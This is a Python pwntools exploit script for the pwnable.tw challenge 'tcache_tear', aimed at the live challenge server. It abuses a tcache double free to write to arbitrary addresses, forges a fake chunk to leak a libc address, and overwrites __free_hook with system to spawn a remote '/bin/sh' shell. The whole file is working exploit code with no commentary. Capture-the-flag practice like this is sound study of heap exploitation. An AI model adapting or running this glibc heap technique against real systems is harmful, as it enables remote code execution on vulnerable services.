from pwn import *

locdbg=False
slpt=0.3

host='chall.pwnable.tw'
port=10207
filename='./tcache_tear'
libcname='./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so'
elf=ELF(filename)

if locdbg:
    p=process(filename)
    libc=ELF('/home/xieq/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6')
    context.log_level='debug'
else:
    p=remote(host,port)
    libc=ELF(libcname)
    #context.log_level='debug'

def pwndbg():
    if locdbg:
        gdb.attach(p)

def slp():
    if not locdbg:
        sleep(slpt)

def fin():
    p.interactive()

def mlc(sz,ctt):
    p.recvuntil(b'choice :')
    p.sendline(b'1')
    slp()
    p.recvuntil(b'Size:')
    p.send(str(sz).encode())
    slp()
    p.recvuntil(b'Data:')
    p.send(ctt)
    slp()

def fr():
    p.recvuntil(b'choice :')
    p.sendline(b'2')
    slp()

def inf():
    p.recvuntil(b'choice :')
    p.sendline(b'3')
    slp()

def wrt(sz,addr,ctt):
    mlc(sz,b'test')
    fr()
    fr()
    mlc(sz,p64(addr))
    mlc(sz,b'test')
    mlc(sz,ctt)

bss_name_buf=0x602060
fake_sz=0x501

p.recvuntil(b'Name:')
p.send(p64(0)+p64(fake_sz))

#pwndbg()

wrt(0x50,bss_name_buf+0x500,(p64(0)+p64(0x21)+p64(0)*2)*2)
wrt(0x60,bss_name_buf+0x10,b'test')
fr()

inf()
main_arena_addr=u64(p.recvuntil(b'$')[22:30])-96
main_arena_ofs=0x3ebc40
libc_base=main_arena_addr-main_arena_ofs
print('libc base: '+hex(libc_base))

free_hook_addr=libc_base+libc.symbols['__free_hook']
system_addr=libc_base+libc.symbols['system']

wrt(0x70,free_hook_addr,p64(system_addr))
mlc(0x80,'/bin/sh\0')
fr()

fin()
